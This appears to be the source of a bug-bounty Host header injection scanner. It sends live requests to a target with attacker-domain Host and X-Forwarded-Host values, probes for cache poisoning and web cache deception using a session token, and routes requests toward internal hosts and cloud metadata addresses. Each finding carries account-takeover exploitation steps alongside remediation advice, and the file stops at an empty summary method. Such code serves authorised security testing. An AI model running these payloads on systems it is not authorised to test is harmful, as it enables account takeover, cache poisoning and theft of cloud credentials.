#!/usr/bin/env python3
"""
Host Header Injection Tester - Host Header Vulnerability Scanner

Advanced host header manipulation detection agent specializing in password reset
poisoning, cache poisoning, web cache deception, SSO bypass, and routing-based
SSRF attacks.

Author: BountyHound Security Research Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import asyncio
import aiohttp
import json
import re
import hashlib
import time
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urljoin, urlparse
from collections import defaultdict
from datetime import datetime
from colorama import Fore, Style
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks



class InjectionType(Enum):
    """Host header injection attack categories"""
    PASSWORD_RESET_POISONING = "password_reset_poisoning"
    CACHE_POISONING = "cache_poisoning"
    WEB_CACHE_DECEPTION = "web_cache_deception"
    SSO_BYPASS = "sso_bypass"
    ROUTING_SSRF = "routing_ssrf"
    ABSOLUTE_URL_MANIPULATION = "absolute_url_manipulation"
    OPEN_REDIRECT = "open_redirect"


class Severity(Enum):
    """Finding severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class HostInjectionFinding:
    """Host header injection vulnerability finding"""
    injection_type: InjectionType
    severity: Severity
    title: str
    description: str
    endpoint: str
    method: str
    injected_host: str
    original_host: str
    proof_of_concept: Dict[str, Any]
    impact: str
    exploitation_steps: List[str]
    evidence: str
    bounty_estimate: Tuple[int, int] = (0, 0)
    remediation: str = ""
    cwe: List[str] = field(default_factory=list)
    affected_headers: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary"""
        return {
            'injection_type': self.injection_type.value,
            'severity': self.severity.value,
            'title': self.title,
            'description': self.description,
            'endpoint': self.endpoint,
            'method': self.method,
            'injected_host': self.injected_host,
            'original_host': self.original_host,
            'proof_of_concept': self.proof_of_concept,
            'impact': self.impact,
            'exploitation_steps': self.exploitation_steps,
            'evidence': self.evidence,
            'bounty_estimate': f"${self.bounty_estimate[0]:,} - ${self.bounty_estimate[1]:,}",
            'remediation': self.remediation,
            'cwe': self.cwe,
            'affected_headers': self.affected_headers,
            'timestamp': self.timestamp
        }


class PasswordResetPoisoningTester:
    """Test for password reset poisoning vulnerabilities"""

    def __init__(self, base_url: str, session: aiohttp.ClientSession, target_domain: str):
        self.base_url = base_url
        self.session = session
        self.target_domain = target_domain
        self.findings: List[HostInjectionFinding] = []
        self.attacker_domain = "evil.attacker.com"

    async def test_password_reset_poisoning(
        self,
        reset_endpoints: List[str],
        test_email: str
    ) -> List[HostInjectionFinding]:
        """Test password reset flows for host header injection"""

        print(f"{Fore.YELLOW}[*] Testing password reset poisoning...{Style.RESET_ALL}")

        for endpoint in reset_endpoints:
            # Test various host header variations
            finding = await self._test_reset_endpoint(endpoint, test_email)
            if finding:
                self.findings.append(finding)

        return self.findings

    async def _test_reset_endpoint(
        self,
        endpoint: str,
        test_email: str
    ) -> Optional[HostInjectionFinding]:
        """Test single password reset endpoint"""

        url = urljoin(self.base_url, endpoint)
        original_host = urlparse(self.base_url).netloc

        # Host header variations to test
        host_variations = [
            self.attacker_domain,
            f"{original_host}@{self.attacker_domain}",
            f"{original_host}.{self.attacker_domain}",
            f"{original_host}%2F{self.attacker_domain}",
            f"{original_host}%20{self.attacker_domain}",
            f"{original_host}%09{self.attacker_domain}",
            f"{original_host};{self.attacker_domain}",
        ]

        for injected_host in host_variations:
            # Send password reset request with injected Host header
            headers = {
                "Host": injected_host,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }

            data = {"email": test_email}

            try:
                async with self.session.post(
                    url,
                    json=data,
                    headers=headers,
                    allow_redirects=False,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:

                    status = resp.status
                    body = await resp.text()
                    response_headers = dict(resp.headers)

                    # Check if request was accepted
                    if status in [200, 201, 202]:
                        # Check if injected host appears in response
                        if injected_host in body or self.attacker_domain in body:
                            finding = HostInjectionFinding(
                                injection_type=InjectionType.PASSWORD_RESET_POISONING,
                                severity=Severity.CRITICAL,
                                title=f"Password Reset Poisoning via Host Header: {endpoint}",
                                description=(
                                    f"Password reset endpoint accepts attacker-controlled Host header. "
                                    f"Injected host '{injected_host}' appears in response, indicating "
                                    "password reset link will contain attacker domain."
                                ),
                                endpoint=endpoint,
                                method="POST",
                                injected_host=injected_host,
                                original_host=original_host,
                                proof_of_concept={
                                    "request": {
                                        "url": url,
                                        "method": "POST",
                                        "headers": {"Host": injected_host},
                                        "body": data
                                    },
                                    "response": {
                                        "status": status,
                                        "body_contains_attacker_domain": True,
                                        "body_sample": body[:500]
                                    }
                                },
                                impact=(
                                    "Attacker can poison password reset links to redirect to attacker-controlled "
                                    "domain. When victim clicks the reset link in email, their reset token is "
                                    "sent to attacker, enabling full account takeover. This affects all users "
                                    "who request password resets during the attack window."
                                ),
                                exploitation_steps=[
                                    "1. Identify password reset endpoint",
                                    "2. Send reset request with Host header set to attacker domain",
                                    f"   POST {url}",
                                    f"   Host: {injected_host}",
                                    f"   {{\"email\": \"victim@example.com\"}}",
                                    "3. Victim receives email with reset link pointing to attacker domain",
                                    "4. Victim clicks link, token is sent to attacker",
                                    "5. Attacker uses token to reset victim's password",
                                    "6. Full account takeover achieved"
                                ],
                                evidence=body[:1000],
                                bounty_estimate=(10000, 50000),
                                remediation=(
                                    "Implement proper host validation:\n\n"
                                    "1. Whitelist allowed hostnames:\n"
                                    "   ```python\n"
                                    "   ALLOWED_HOSTS = ['example.com', 'www.example.com']\n"
                                    "   if request.host not in ALLOWED_HOSTS:\n"
                                    "       raise InvalidHostError()\n"
                                    "   ```\n\n"
                                    "2. Use SERVER_NAME instead of Host header:\n"
                                    "   ```python\n"
                                    "   reset_url = f'https://{SERVER_NAME}/reset/{token}'\n"
                                    "   ```\n\n"
                                    "3. Django example:\n"
                                    "   ```python\n"
                                    "   ALLOWED_HOSTS = ['example.com']\n"
                                    "   USE_X_FORWARDED_HOST = False\n"
                                    "   ```\n\n"
                                    "4. Validate email reset links:\n"
                                    "   - Never use Host header for URL generation\n"
                                    "   - Use hardcoded base URL from configuration\n"
                                    "   - Validate host before sending emails"
                                ),
                                cwe=["CWE-640", "CWE-644"],
                                affected_headers=["Host", "X-Forwarded-Host"]
                            )

                            return finding

                        # Check for indirect indicators
                        # Even if domain not in response, check Location header
                        location = response_headers.get('Location', '')
                        if injected_host in location or self.attacker_domain in location:
                            finding = HostInjectionFinding(
                                injection_type=InjectionType.PASSWORD_RESET_POISONING,
                                severity=Severity.HIGH,
                                title=f"Password Reset Poisoning (Redirect): {endpoint}",
                                description=(
                                    f"Password reset endpoint reflects injected Host header in Location "
                                    f"header. Redirect contains attacker domain: {location}"
                                ),
                                endpoint=endpoint,
                                method="POST",
                                injected_host=injected_host,
                                original_host=original_host,
                                proof_of_concept={
                                    "request": {"url": url, "host_header": injected_host},
                                    "response": {"status": status, "location": location}
                                },
                                impact=(
                                    "Host header injection in redirect can lead to password reset "
                                    "token theft if application uses redirect URLs in email templates."
                                ),
                                exploitation_steps=[
                                    "1. Send reset request with injected Host header",
                                    "2. Response redirects to attacker domain",
                                    "3. If redirect URL used in email, token is leaked"
                                ],
                                evidence=f"Location: {location}",
                                bounty_estimate=(5000, 20000),
                                remediation="Validate Host header and use hardcoded base URLs",
                                cwe=["CWE-640", "CWE-601"],
                                affected_headers=["Host"]
                            )

                            return finding

            except asyncio.TimeoutError:
                print(f"  Timeout testing {url} with host {injected_host}")
            except Exception as e:
                print(f"  Error testing {url} with host {injected_host}: {e}")

        return None

    async def test_x_forwarded_host(
        self,
        reset_endpoints: List[str],
        test_email: str
    ) -> List[HostInjectionFinding]:
        """Test X-Forwarded-Host header variations"""

        print(f"{Fore.YELLOW}[*] Testing X-Forwarded-Host variations...{Style.RESET_ALL}")

        for endpoint in reset_endpoints:
            url = urljoin(self.base_url, endpoint)
            original_host = urlparse(self.base_url).netloc

            headers = {
                "Host": original_host,
                "X-Forwarded-Host": self.attacker_domain,
                "Content-Type": "application/json"
            }

            data = {"email": test_email}

            try:
                async with self.session.post(
                    url,
                    json=data,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    body = await resp.text()

                    if self.attacker_domain in body:
                        finding = HostInjectionFinding(
                            injection_type=InjectionType.PASSWORD_RESET_POISONING,
                            severity=Severity.HIGH,
                            title=f"Password Reset Poisoning via X-Forwarded-Host",
                            description=(
                                f"Application trusts X-Forwarded-Host header for URL generation. "
                                f"Attacker domain appears in response."
                            ),
                            endpoint=endpoint,
                            method="POST",
                            injected_host=self.attacker_domain,
                            original_host=original_host,
                            proof_of_concept={
                                "headers": headers,
                                "body": data,
                                "response_contains": self.attacker_domain
                            },
                            impact=(
                                "X-Forwarded-Host header trusted for password reset link generation, "
                                "enabling account takeover via token theft."
                            ),
                            exploitation_steps=[
                                "1. Send reset request with X-Forwarded-Host header",
                                "2. Application generates reset link with attacker domain",
                                "3. Victim clicks link, token stolen"
                            ],
                            evidence=body[:1000],
                            bounty_estimate=(8000, 30000),
                            remediation=(
                                "- Never trust X-Forwarded-Host without validation\n"
                                "- Disable X-Forwarded-Host processing: USE_X_FORWARDED_HOST = False\n"
                                "- If needed, whitelist trusted proxy IPs"
                            ),
                            cwe=["CWE-640", "CWE-807"],
                            affected_headers=["X-Forwarded-Host", "X-Host"]
                        )

                        self.findings.append(finding)
                        return self.findings

            except Exception as e:
                print(f"  Error testing X-Forwarded-Host: {e}")

        return self.findings


class CachePoisoningTester:
    """Test for cache poisoning via Host header"""

    def __init__(self, base_url: str, session: aiohttp.ClientSession, target_domain: str):
        self.base_url = base_url
        self.session = session
        self.target_domain = target_domain
        self.findings: List[HostInjectionFinding] = []
        self.attacker_domain = "evil.attacker.com"

    async def test_cache_poisoning(self, endpoints: List[str]) -> List[HostInjectionFinding]:
        """Test endpoints for cache poisoning vulnerabilities"""

        print(f"{Fore.YELLOW}[*] Testing cache poisoning via Host header...{Style.RESET_ALL}")

        for endpoint in endpoints:
            finding = await self._test_unkeyed_host_header(endpoint)
            if finding:
                self.findings.append(finding)

        return self.findings

    async def _test_unkeyed_host_header(self, endpoint: str) -> Optional[HostInjectionFinding]:
        """Test if Host header is unkeyed in cache"""

        url = urljoin(self.base_url, endpoint)
        original_host = urlparse(self.base_url).netloc

        # Step 1: Send request with attacker host
        poison_headers = {
            "Host": self.attacker_domain,
            "X-Cache-Buster": str(time.time())  # Ensure unique request
        }

        try:
            async with self.session.get(
                url,
                headers=poison_headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as poison_resp:
                poison_body = await poison_resp.text()
                poison_cache_status = poison_resp.headers.get('X-Cache', 'MISS')

                # Check if attacker host reflected in response
                if self.attacker_domain in poison_body:
                    # Step 2: Send normal request to check if poisoned response is cached
                    await asyncio.sleep(1)  # Brief delay

                    normal_headers = {"Host": original_host}
                    async with self.session.get(
                        url,
                        headers=normal_headers,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as normal_resp:
                        normal_body = await normal_resp.text()
                        normal_cache_status = normal_resp.headers.get('X-Cache', 'MISS')

                        # If attacker domain appears in normal request response, cache is poisoned
                        if self.attacker_domain in normal_body and 'HIT' in normal_cache_status.upper():
                            finding = HostInjectionFinding(
                                injection_type=InjectionType.CACHE_POISONING,
                                severity=Severity.CRITICAL,
                                title=f"Cache Poisoning via Unkeyed Host Header: {endpoint}",
                                description=(
                                    f"Host header is not part of cache key. Attacker can poison cache "
                                    f"with malicious host, affecting all users who access {endpoint}."
                                ),
                                endpoint=endpoint,
                                method="GET",
                                injected_host=self.attacker_domain,
                                original_host=original_host,
                                proof_of_concept={
                                    "step1_poison": {
                                        "url": url,
                                        "headers": poison_headers,
                                        "response_contains_attacker_domain": True,
                                        "cache_status": poison_cache_status
                                    },
                                    "step2_verify": {
                                        "url": url,
                                        "headers": normal_headers,
                                        "response_still_contains_attacker_domain": True,
                                        "cache_status": normal_cache_status
                                    }
                                },
                                impact=(
                                    "Attacker can poison cache with malicious host header, causing all "
                                    "users to receive poisoned response. This can lead to:\n"
                                    "- XSS via injected JavaScript URLs\n"
                                    "- Credential theft via phishing redirects\n"
                                    "- Malware distribution\n"
                                    "- Defacement\n"
                                    "Affects ALL users until cache expires."
                                ),
                                exploitation_steps=[
                                    "1. Identify cacheable endpoint with Host reflection",
                                    f"2. Send request with Host: {self.attacker_domain}",
                                    "3. Response is cached with attacker domain",
                                    "4. All subsequent users receive poisoned cache",
                                    "5. Users click links pointing to attacker domain",
                                    "6. Mass credential theft or XSS"
                                ],
                                evidence=f"Poisoned response cached: {normal_body[:500]}",
                                bounty_estimate=(15000, 50000),
                                remediation=(
                                    "Fix cache poisoning vulnerability:\n\n"
                                    "1. Include Host header in cache key:\n"
                                    "   ```nginx\n"
                                    "   proxy_cache_key \"$scheme$host$request_uri\";\n"
                                    "   ```\n\n"
                                    "2. Validate Host header before caching:\n"
                                    "   ```python\n"
                                    "   if request.host not in ALLOWED_HOSTS:\n"
                                    "       return error_response()\n"
                                    "   ```\n\n"
                                    "3. Set Cache-Control headers:\n"
                                    "   ```\n"
                                    "   Cache-Control: private, no-cache\n"
                                    "   Vary: Host\n"
                                    "   ```\n\n"
                                    "4. Use Vary header:\n"
                                    "   ```\n"
                                    "   Vary: Host\n"
                                    "   ```"
                                ),
                                cwe=["CWE-444", "CWE-641"],
                                affected_headers=["Host"]
                            )

                            return finding

        except Exception as e:
            print(f"  Error testing cache poisoning on {url}: {e}")

        return None


class WebCacheDeceptionTester:
    """Test for web cache deception vulnerabilities"""

    def __init__(self, base_url: str, session: aiohttp.ClientSession, target_domain: str):
        self.base_url = base_url
        self.session = session
        self.target_domain = target_domain
        self.findings: List[HostInjectionFinding] = []

    async def test_web_cache_deception(
        self,
        sensitive_endpoints: List[str],
        session_token: str
    ) -> List[HostInjectionFinding]:
        """Test for web cache deception via path confusion"""

        print(f"{Fore.YELLOW}[*] Testing web cache deception...{Style.RESET_ALL}")

        for endpoint in sensitive_endpoints:
            finding = await self._test_path_confusion(endpoint, session_token)
            if finding:
                self.findings.append(finding)

        return self.findings

    async def _test_path_confusion(
        self,
        endpoint: str,
        session_token: str
    ) -> Optional[HostInjectionFinding]:
        """Test if dynamic content can be cached via path manipulation"""

        url = urljoin(self.base_url, endpoint)

        # Append static file extensions to trick cache
        static_extensions = [
            ".css",
            ".js",
            ".jpg",
            ".png",
            ".svg",
            ".ico",
            ".woff",
        ]

        headers = {
            "Authorization": f"Bearer {session_token}",
            "Cookie": f"session={session_token}"
        }

        for ext in static_extensions:
            test_url = f"{url}{ext}"

            try:
                # Send authenticated request
                async with self.session.get(
                    test_url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    body = await resp.text()
                    cache_control = resp.headers.get('Cache-Control', '')
                    x_cache = resp.headers.get('X-Cache', '')

                    # Check if sensitive content is returned and cacheable
                    is_cacheable = (
                        'no-cache' not in cache_control.lower() and
                        'private' not in cache_control.lower()
                    )

                    # Look for sensitive data indicators
                    sensitive_indicators = [
                        'email', 'username', 'account', 'profile',
                        'balance', 'ssn', 'api_key', 'token'
                    ]

                    has_sensitive_data = any(
                        indicator in body.lower()
                        for indicator in sensitive_indicators
                    )

                    if has_sensitive_data and is_cacheable:
                        finding = HostInjectionFinding(
                            injection_type=InjectionType.WEB_CACHE_DECEPTION,
                            severity=Severity.HIGH,
                            title=f"Web Cache Deception: {endpoint}{ext}",
                            description=(
                                f"Dynamic endpoint {endpoint} returns sensitive data when "
                                f"accessed with static file extension {ext}. Content is "
                                "cacheable, enabling attacker to steal user data."
                            ),
                            endpoint=endpoint,
                            method="GET",
                            injected_host="N/A",
                            original_host=urlparse(self.base_url).netloc,
                            proof_of_concept={
                                "url": test_url,
                                "cacheable": is_cacheable,
                                "cache_control": cache_control,
                                "x_cache": x_cache,
                                "contains_sensitive_data": True,
                                "response_sample": body[:500]
                            },
                            impact=(
                                "Attacker can trick victim into accessing URL with static extension. "
                                "Victim's sensitive data (profile, emails, API keys) is cached and "
                                "accessible to attacker. This leads to:\n"
                                "- Personal information disclosure\n"
                                "- Session token theft\n"
                                "- API key leakage\n"
                                "- Financial data exposure"
                            ),
                            exploitation_steps=[
                                "1. Identify dynamic endpoint with sensitive data",
                                f"2. Craft URL with static extension: {test_url}",
                                "3. Trick victim into accessing URL (phishing, XSS, open redirect)",
                                "4. Victim's sensitive data is cached",
                                "5. Attacker accesses same URL to retrieve cached data",
                                "6. Sensitive information stolen"
                            ],
                            evidence=body[:1000],
                            bounty_estimate=(5000, 20000),
                            remediation=(
                                "Prevent web cache deception:\n\n"
                                "1. Normalize URLs before processing:\n"
                                "   ```python\n"
                                "   # Remove path extensions\n"
                                "   clean_path = re.sub(r'\\.[a-z]+$', '', request.path)\n"
                                "   ```\n\n"
                                "2. Set proper cache headers for dynamic content:\n"
                                "   ```\n"
                                "   Cache-Control: private, no-cache, no-store\n"
                                "   ```\n\n"
                                "3. Validate request paths:\n"
                                "   ```python\n"
                                "   if not is_valid_path(request.path):\n"
                                "       return 404\n"
                                "   ```\n\n"
                                "4. Configure cache to not cache dynamic endpoints:\n"
                                "   ```nginx\n"
                                "   location /api/ {\n"
                                "       proxy_no_cache 1;\n"
                                "   }\n"
                                "   ```"
                            ),
                            cwe=["CWE-639", "CWE-524"],
                            affected_headers=["Cache-Control"]
                        )

                        return finding

            except Exception as e:
                print(f"  Error testing {test_url}: {e}")

        return None


class SSOBypassTester:
    """Test for SSO bypass via Host header manipulation"""

    def __init__(self, base_url: str, session: aiohttp.ClientSession, target_domain: str):
        self.base_url = base_url
        self.session = session
        self.target_domain = target_domain
        self.findings: List[HostInjectionFinding] = []
        self.attacker_domain = "evil.attacker.com"

    async def test_sso_bypass(self, sso_endpoints: List[str]) -> List[HostInjectionFinding]:
        """Test SSO endpoints for Host header vulnerabilities"""

        print(f"{Fore.YELLOW}[*] Testing SSO bypass via Host header...{Style.RESET_ALL}")

        for endpoint in sso_endpoints:
            finding = await self._test_oauth_redirect(endpoint)
            if finding:
                self.findings.append(finding)

        return self.findings

    async def _test_oauth_redirect(self, endpoint: str) -> Optional[HostInjectionFinding]:
        """Test OAuth/SAML redirect manipulation"""

        url = urljoin(self.base_url, endpoint)
        original_host = urlparse(self.base_url).netloc

        # Inject Host header
        headers = {"Host": self.attacker_domain}

        try:
            async with self.session.get(
                url,
                headers=headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                location = resp.headers.get('Location', '')
                body = await resp.text()

                # Check if redirect contains attacker domain
                if self.attacker_domain in location:
                    finding = HostInjectionFinding(
                        injection_type=InjectionType.SSO_BYPASS,
                        severity=Severity.CRITICAL,
                        title=f"SSO Redirect Manipulation: {endpoint}",
                        description=(
                            f"SSO endpoint uses Host header for redirect_uri generation. "
                            f"OAuth/SAML callback redirects to attacker domain: {location}"
                        ),
                        endpoint=endpoint,
                        method="GET",
                        injected_host=self.attacker_domain,
                        original_host=original_host,
                        proof_of_concept={
                            "url": url,
                            "injected_header": {"Host": self.attacker_domain},
                            "redirect_location": location,
                            "status": resp.status
                        },
                        impact=(
                            "Attacker can manipulate OAuth/SAML redirect to steal authorization "
                            "codes or tokens. This leads to:\n"
                            "- Full account takeover\n"
                            "- Access token theft\n"
                            "- Authorization code interception\n"
                            "- SSO bypass for any user"
                        ),
                        exploitation_steps=[
                            "1. Identify SSO/OAuth endpoint",
                            f"2. Send request with Host: {self.attacker_domain}",
                            "3. User is redirected to attacker domain after authentication",
                            "4. Authorization code/token sent to attacker",
                            "5. Attacker exchanges code for access token",
                            "6. Account takeover complete"
                        ],
                        evidence=f"Location: {location}",
                        bounty_estimate=(10000, 40000),
                        remediation=(
                            "Secure OAuth/SAML redirect handling:\n\n"
                            "1. Whitelist redirect URIs:\n"
                            "   ```python\n"
                            "   ALLOWED_REDIRECT_URIS = [\n"
                            "       'https://example.com/callback',\n"
                            "       'https://app.example.com/oauth/callback'\n"
                            "   ]\n"
                            "   if redirect_uri not in ALLOWED_REDIRECT_URIS:\n"
                            "       raise InvalidRedirectError()\n"
                            "   ```\n\n"
                            "2. Use hardcoded base URLs:\n"
                            "   ```python\n"
                            "   redirect_uri = f'{BASE_URL}/oauth/callback'\n"
                            "   ```\n\n"
                            "3. Validate Host header:\n"
                            "   ```python\n"
                            "   if request.host not in ALLOWED_HOSTS:\n"
                            "       raise InvalidHostError()\n"
                            "   ```"
                        ),
                        cwe=["CWE-601", "CWE-640"],
                        affected_headers=["Host"]
                    )

                    return finding

        except Exception as e:
            print(f"  Error testing {url}: {e}")

        return None


class RoutingSSRFTester:
    """Test for routing-based SSRF via Host header"""

    def __init__(self, base_url: str, session: aiohttp.ClientSession, target_domain: str):
        self.base_url = base_url
        self.session = session
        self.target_domain = target_domain
        self.findings: List[HostInjectionFinding] = []

    async def test_routing_ssrf(self, endpoints: List[str]) -> List[HostInjectionFinding]:
        """Test for routing-based SSRF vulnerabilities"""

        print(f"{Fore.YELLOW}[*] Testing routing-based SSRF...{Style.RESET_ALL}")

        # Internal targets to test
        internal_targets = [
            "localhost",
            "127.0.0.1",
            "0.0.0.0",
            "169.254.169.254",  # AWS metadata
            "metadata.google.internal",  # GCP metadata
            "192.168.1.1",
            "10.0.0.1",
        ]

        for endpoint in endpoints:
            for target in internal_targets:
                finding = await self._test_internal_routing(endpoint, target)
                if finding:
                    self.findings.append(finding)

        return self.findings

    async def _test_internal_routing(
        self,
        endpoint: str,
        internal_target: str
    ) -> Optional[HostInjectionFinding]:
        """Test if Host header can route to internal services"""

        url = urljoin(self.base_url, endpoint)
        original_host = urlparse(self.base_url).netloc

        headers = {"Host": internal_target}

        try:
            async with self.session.get(
                url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                body = await resp.text()
                status = resp.status

                # Look for indicators of internal service
                internal_indicators = [
                    "apache", "nginx", "iis", "lighttpd",  # Web servers
                    "tomcat", "jetty", "jboss",  # App servers
                    "redis", "memcached", "mongodb",  # Databases
                    "consul", "etcd", "kubernetes",  # Orchestration
                    "ami-id", "instance-id", "iam",  # Cloud metadata
                ]

                body_lower = body.lower()
                detected_service = None

                for indicator in internal_indicators:
                    if indicator in body_lower:
                        detected_service = indicator
                        break

                if detected_service or (status == 200 and internal_target in ["localhost", "127.0.0.1"]):
                    severity = Severity.CRITICAL if "169.254.169.254" in internal_target else Severity.HIGH

                    finding = HostInjectionFinding(
                        injection_type=InjectionType.ROUTING_SSRF,
                        severity=severity,
                        title=f"Routing-Based SSRF via Host Header: {internal_target}",
                        description=(
                            f"Host header injection routes request to internal service: {internal_target}. "
                            f"Detected service: {detected_service or 'Unknown internal service'}"
                        ),
                        endpoint=endpoint,
                        method="GET",
                        injected_host=internal_target,
                        original_host=original_host,
                        proof_of_concept={
                            "url": url,
                            "injected_header": {"Host": internal_target},
                            "response_status": status,
                            "detected_service": detected_service,
                            "response_sample": body[:500]
                        },
                        impact=(
                            f"Attacker can access internal service at {internal_target} by "
                            "manipulating Host header. This enables:\n"
                            "- Cloud metadata access (AWS/GCP credentials)\n"
                            "- Internal API access\n"
                            "- Database access\n"
                            "- Admin panel access\n"
                            "- Sensitive data exfiltration"
                        ),
                        exploitation_steps=[
                            f"1. Set Host header to: {internal_target}",
                            "2. Request is routed to internal service",
                            "3. Internal service response is returned",
                            "4. Extract sensitive data or credentials",
                            "5. Use credentials for further exploitation"
                        ],
                        evidence=body[:1000],
                        bounty_estimate=(8000, 35000),
                        remediation=(
                            "Prevent routing-based SSRF:\n\n"
                            "1. Validate Host header against whitelist:\n"
                            "   ```python\n"
                            "   ALLOWED_HOSTS = ['example.com', 'www.example.com']\n"
                            "   if request.host not in ALLOWED_HOSTS:\n"
                            "       raise InvalidHostError()\n"
                            "   ```\n\n"
                            "2. Configure reverse proxy to reject invalid hosts:\n"
                            "   ```nginx\n"
                            "   server {\n"
                            "       server_name example.com;\n"
                            "       if ($host != 'example.com') {\n"
                            "           return 444;\n"
                            "       }\n"
                            "   }\n"
                            "   ```\n\n"
                            "3. Block access to metadata endpoints:\n"
                            "   ```\n"
                            "   iptables -A OUTPUT -d 169.254.169.254 -j DROP\n"
                            "   ```"
                        ),
                        cwe=["CWE-918", "CWE-641"],
                        affected_headers=["Host"]
                    )

                    return finding

        except asyncio.TimeoutError:
            # Timeout might indicate successful routing to slow internal service
            pass
        except Exception as e:
            print(f"  Error testing {url} with host {internal_target}: {e}")

        return None


class HostHeaderInjectionTester:
    """Main orchestrator for host header injection detection"""

    def __init__(
        self,
        target_url: str,
        target_domain: Optional[str] = None,
        test_email: Optional[str] = None,
        session_token: Optional[str] = None
    ):
        self.target_url = target_url
        self.target_domain = target_domain or urlparse(target_url).netloc
        self.test_email = test_email or "test@example.com"
        self.session_token = session_token
        self.findings: List[HostInjectionFinding] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.tests_run = 0
        self.tests_passed = 0

    async def initialize(self):
        """Initialize HTTP session"""
        connector = aiohttp.TCPConnector(ssl=False)  # Disable SSL verification for testing
        self.session = aiohttp.ClientSession(connector=connector)

    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()

    async def run_full_scan(self) -> List[HostInjectionFinding]:
        """Execute comprehensive host header injection scan"""

        # Database check first
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target_domain}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target_domain, 'host_header_injection_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}[*] Starting Host Header Injection Scan{Style.RESET_ALL}")
        print(f"[*] Target: {self.target_url}")

        await self.initialize()

        # Initialize testers
        password_reset_tester = PasswordResetPoisoningTester(self.target_url, self.session, self.target_domain)
        cache_poisoning_tester = CachePoisoningTester(self.target_url, self.session, self.target_domain)
        cache_deception_tester = WebCacheDeceptionTester(self.target_url, self.session, self.target_domain)
        sso_tester = SSOBypassTester(self.target_url, self.session, self.target_domain)
        ssrf_tester = RoutingSSRFTester(self.target_url, self.session, self.target_domain)

        # Define target endpoints
        reset_endpoints = ["/password/reset", "/forgot-password", "/reset", "/api/password/reset"]
        cacheable_endpoints = ["/", "/home", "/products", "/api/config"]
        sensitive_endpoints = ["/profile", "/account", "/dashboard", "/api/me"]
        sso_endpoints = ["/oauth/authorize", "/saml/login", "/sso/callback", "/auth/login"]
        general_endpoints = ["/", "/api/health", "/status"]

        # Run all tests
        print(f"\n{Fore.CYAN}[+] Testing password reset poisoning...{Style.RESET_ALL}")
        reset_findings = await password_reset_tester.test_password_reset_poisoning(
            reset_endpoints,
            self.test_email
        )
        self.tests_run += len(reset_endpoints) * 7  # 7 host variations per endpoint

        print(f"\n{Fore.CYAN}[+] Testing X-Forwarded-Host...{Style.RESET_ALL}")
        xfh_findings = await password_reset_tester.test_x_forwarded_host(
            reset_endpoints,
            self.test_email
        )
        self.tests_run += len(reset_endpoints)

        print(f"\n{Fore.CYAN}[+] Testing cache poisoning...{Style.RESET_ALL}")
        cache_findings = await cache_poisoning_tester.test_cache_poisoning(cacheable_endpoints)
        self.tests_run += len(cacheable_endpoints)

        if self.session_token:
            print(f"\n{Fore.CYAN}[+] Testing web cache deception...{Style.RESET_ALL}")
            deception_findings = await cache_deception_tester.test_web_cache_deception(
                sensitive_endpoints,
                self.session_token
            )
            self.tests_run += len(sensitive_endpoints) * 7  # 7 extensions per endpoint
        else:
            deception_findings = []
            print(f"\n{Fore.YELLOW}[*] Skipping web cache deception (no session token){Style.RESET_ALL}")

        print(f"\n{Fore.CYAN}[+] Testing SSO bypass...{Style.RESET_ALL}")
        sso_findings = await sso_tester.test_sso_bypass(sso_endpoints)
        self.tests_run += len(sso_endpoints)

        print(f"\n{Fore.CYAN}[+] Testing routing-based SSRF...{Style.RESET_ALL}")
        ssrf_findings = await ssrf_tester.test_routing_ssrf(general_endpoints)
        self.tests_run += len(general_endpoints) * 7  # 7 internal targets per endpoint

        # Aggregate findings
        self.findings.extend(reset_findings)
        self.findings.extend(xfh_findings)
        self.findings.extend(cache_findings)
        self.findings.extend(deception_findings)
        self.findings.extend(sso_findings)
        self.findings.extend(ssrf_findings)

        self.tests_passed = len(self.findings)

        await self.cleanup()

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target_domain,
            'host_header_injection_tester',
            findings_count=len(self.findings),
            duration_seconds=0,  # Can track if needed
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in [Severity.CRITICAL, Severity.HIGH]:
                PayloadHooks.record_payload_success(
                    payload_text=finding.injected_host,
                    vuln_type=finding.injection_type.value,
                    context=finding.endpoint,
                    notes=finding.title
                )

        print(f"\n{Fore.CYAN}=== HOST HEADER INJECTION TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Tests run: {self.tests_run}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    def _print_findings_summary(self):
        """Print summary of findings"""
